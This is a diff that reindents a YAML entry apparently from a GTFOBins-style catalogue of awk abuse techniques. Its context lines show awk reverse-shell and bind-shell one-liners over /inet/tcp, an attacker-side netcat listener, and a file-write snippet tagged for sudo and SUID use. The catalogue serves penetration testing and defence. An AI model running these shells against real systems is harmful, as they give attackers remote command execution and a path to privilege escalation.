@@ -7,7 +7,7 @@ functions:
       - interactive
       - sudo-enabled
       - suid-enabled
-    
+  
   reverse-shell:
     examples:
       - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
@@ -18,10 +18,10 @@ functions:
               s = "/inet/tcp/0/" RHOST "/" RPORT;
               while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
               while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
-     features:
-       - non-interactive
-       - sudo-enabled
-       - suid-enabled
+    features:
+      - non-interactive
+      - sudo-enabled
+      - suid-enabled
        
   bind-shell:
     examples:
@@ -32,10 +32,10 @@ functions:
               s = "/inet/tcp/" LPORT "/0/0";
               while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
               while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
-     features:
-       - non-interactive
-       - sudo-enabled
-       - suid-enabled
+    features:
+      - non-interactive
+      - sudo-enabled
+      - suid-enabled
 
   file-read:
     examples:
@@ -49,10 +49,9 @@ functions:
   file-write:
     examples:
       - code: |
-        LFILE=file_to_write
-        awk -v LFILE=$LFILE 'BEGIN { print "data" > LFILE }'
+          LFILE=file_to_write
+          awk -v LFILE=$LFILE 'BEGIN { print "data" > LFILE }'
     features:
       - sudo-enabled
       - suid-enabled
-
 ---
